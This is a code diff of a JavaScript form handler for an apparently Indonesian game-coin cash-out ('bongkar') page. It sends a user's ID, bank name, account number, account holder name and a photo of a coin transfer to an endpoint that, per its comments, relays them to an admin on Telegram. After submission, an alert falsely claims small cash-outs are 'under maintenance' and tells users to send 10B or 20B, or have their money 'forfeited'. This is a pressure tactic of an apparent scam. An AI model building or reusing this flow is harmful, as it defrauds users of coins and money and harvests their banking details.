@@ -651,95 +651,66 @@ stars.forEach(s => s.classList.add('active'));
     // --- FORM SUBMIT ---
     // Alur pengiriman bukti dibuat seperti detail.html:
     // file diambil dari input -> FormData -> Telegram sendPhoto.
-    document.getElementById("bongkarForm").addEventListener(
-    "submit",
-    async function(e) {
+   document.getElementById("bongkarForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
 
-        e.preventDefault();
+    const btn = document.getElementById("btnSubmit");
+    const fileInput = document.getElementById("myFile");
+    const photo = fileInput.files[0];
 
-        const btn = document.getElementById("btnSubmit");
-        const fileInput = document.getElementById("myFile");
-        const photo = fileInput.files[0];
-
-        if (!photo) {
-            alert(
-                "Wajib upload bukti pengiriman koin terlebih dahulu."
-            );
-            return;
-        }
-
-        btn.innerText = "MENGIRIM...";
-        btn.disabled = true;
-
-        const formData = new FormData(this);
-
-        let msg = `🔔 *BONGKAR BARU*\n\n`;
-
-        msg += `🆔 ID: ${formData.get("id_pengirim")}\n`;
-        msg += `👤 Nick: ${formData.get("nickname")}\n`;
-        msg += `💰 Jumlah: ${formData.get("jumlah_bongkaran")}\n`;
-        msg += `🏦 Bank: ${formData.get("bank_pencairan")}\n`;
-        msg += `💳 No.Rek: ${formData.get("nomor_rekening")}\n`;
-        msg += `✍️ Nama: ${formData.get("atas_nama")}`;
-
-        // FormData untuk API Vercel
-        const telegramForm = new FormData();
-
-        telegramForm.append(
-            "photo",
-            photo,
-            photo.name
-        );
-
-        telegramForm.append(
-            "caption",
-            msg
-        );
-
-        try {
-
-            const response = await fetch(
-                "/api/bongkar",
-                {
-                    method: "POST",
-                    body: telegramForm
-                }
-            );
-
-            const result = await response.json();
-
-            if (!response.ok || !result.ok) {
-                throw new Error(
-                    result.error ||
-                    "Gagal mengirim bukti ke Admin"
-                );
-            }
-
-            alert(
-                "PENCAIRAN BONGKAR DIBAWAH 10B SAAT INI SEDANG MAINTENANCE-GENAPKAN KE 10B ATAU 20B AGAR UANG LANSUNG DI PROSES OTOMATIS(JANGAN ISI FORMAT LEBIH DARI 3X JIKA TETAP MENGISI MAKA UANG HANGUS)."
-            );
-
-            this.reset();
-
-        } catch (error) {
-
-            console.error(
-                "TELEGRAM SEND ERROR:",
-                error
-            );
-
-            alert(
-                "Gagal mengirim bukti gambar ke Admin. Silakan coba lagi."
-            );
-
-        } finally {
-
-            btn.innerText = "PROSES BONGKAR";
-            btn.disabled = false;
-
-        }
+    if (!photo) {
+        alert("Wajib upload bukti pengiriman koin terlebih dahulu.");
+        return;
     }
-);
+
+    btn.innerText = "MENGIRIM...";
+    btn.disabled = true;
+
+    const formData = new FormData(this);
+
+    let msg = `🔔 *BONGKAR BARU*\n\n`;
+    msg += `🆔 ID: ${formData.get('id_pengirim')}\n`;
+    msg += `👤 Nick: ${formData.get('nickname')}\n`;
+    msg += `💰 Jumlah: ${formData.get('jumlah_bongkaran')}\n`;
+    msg += `🏦 Bank: ${formData.get('bank_pencairan')}\n`;
+    msg += `💳 No.Rek: ${formData.get('nomor_rekening')}\n`;
+    msg += `✍️ Nama: ${formData.get('atas_nama')}`;
+
+    // Kirim foto + caption ke API Vercel
+    const telegramForm = new FormData();
+    telegramForm.append("photo", photo, photo.name);
+    telegramForm.append("caption", msg);
+
+    try {
+        const response = await fetch(
+            "/api/bongkar",
+            {
+                method: "POST",
+                body: telegramForm
+            }
+        );
+
+        const result = await response.json();
+
+        if (!response.ok || !result.ok) {
+            throw new Error(
+                result.error || "Gagal mengirim bukti ke Admin"
+            );
+        }
+
+        alert("PENCAIRAN BONGKAR DIBAWAH 10B SAAT INI SEDANG MAINTENANCE-GENAPKAN KE 10B ATAU 20B AGAR UANG LANSUNG DI PROSES OTOMATIS(JANGAN ISI FORMAT LEBIH DARI 3X JIKA TETAP MENGISI MAKA UANG HANGUS).");
+
+        this.reset();
+
+    } catch (error) {
+        console.error("TELEGRAM SEND ERROR:", error);
+        alert("Gagal mengirim bukti gambar ke Admin. Silakan coba lagi.");
+
+    } finally {
+        btn.innerText = "PROSES BONGKAR";
+        btn.disabled = false;
+    }
+});
 
     // --- UTILS ---
     function showNotice() {
